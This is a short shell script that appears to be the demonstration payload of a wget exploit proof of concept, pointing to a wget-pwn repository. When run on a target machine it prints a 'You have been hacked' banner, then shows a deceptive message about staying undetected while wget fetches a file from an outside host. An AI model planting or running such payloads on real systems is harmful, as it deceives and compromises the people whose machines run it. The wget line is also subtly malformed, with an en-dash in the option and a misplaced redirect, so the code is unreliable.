echo
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo "!      You have been hacked               !" 
echo "!                                         !"
echo "! https://github.com/markus-perl/wget-pwn !"
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"

echo "
_____.___.             .__   ._._.
\__  |   | ____ _____  |  |__| | |
 /   |   |/ __ \\__  \ |  |  \ | |
 \____   \  ___/ / __ \|   Y  \|\|
 / ______|\___  >____  /___|  /___
 \/           \/     \/     \/\/\/
 "

printf "Patching downloaded file to stay undetected ... "
wget –quiet "https://github.com/markus-perl/wget-pwn/README.md" > README.md
echo "Done"
